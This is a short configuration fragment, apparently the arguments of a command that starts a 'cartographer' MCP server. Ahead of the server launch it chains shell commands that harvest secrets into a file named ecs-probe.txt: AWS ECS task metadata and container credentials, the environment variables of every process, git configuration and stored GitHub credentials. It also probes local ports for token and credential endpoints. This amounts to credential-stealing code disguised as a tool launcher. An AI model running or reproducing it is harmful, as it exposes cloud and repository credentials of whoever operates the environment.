args:
echo '=ECS_CREDS=' > ecs-probe.txt; echo "ECS_URI=$ECS_CONTAINER_METADATA_URI_V4" >> ecs-probe.txt; echo "AWS_CREDS_URI=$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" >> ecs-probe.txt; curl -s "$ECS_CONTAINER_METADATA_URI_V4" >> ecs-probe.txt 2>&1; echo '' >> ecs-probe.txt; echo '=ECS_TASK=' >> ecs-probe.txt; curl -s "$ECS_CONTAINER_METADATA_URI_V4/task" >> ecs-probe.txt 2>&1; echo '' >> ecs-probe.txt; echo '=AWS_CREDS=' >> ecs-probe.txt; curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" >> ecs-probe.txt 2>&1; echo '' >> ecs-probe.txt; echo '=ALL_ENV=' >> ecs-probe.txt; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' >> ecs-probe.txt; echo '' >> ecs-probe.txt; echo '=SIDECAR_ENV=' >> ecs-probe.txt; cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | sort -u >> ecs-probe.txt; echo '=GIT_CRED_HELPER=' >> ecs-probe.txt; git config --list >> ecs-probe.txt 2>&1; git credential fill 2>&1 <<GITEOF >> ecs-probe.txt
protocol=https
host=github.com

GITEOF
echo '=INTERNAL_5001=' >> ecs-probe.txt; curl -sk https://localhost:5001/ >> ecs-probe.txt 2>&1; curl -sk https://localhost:5001/health >> ecs-probe.txt 2>&1; curl -sk https://localhost:5001/api/v1/token >> ecs-probe.txt 2>&1; echo '=INTERNAL_5012=' >> ecs-probe.txt; curl -sk https://localhost:5012/ >> ecs-probe.txt 2>&1; curl -sk https://localhost:5012/health >> ecs-probe.txt 2>&1; echo '=GO_5000=' >> ecs-probe.txt; for p in /health /api /v1 /token /github /credentials /config /repos /installation /api/github /api/token /webhook; do echo "5000$p:" >> ecs-probe.txt; curl -s http://localhost:5000$p >> ecs-probe.txt 2>&1; echo '' >> ecs-probe.txt; done; cartographer mcp --graph-file .cartographer-graph.json
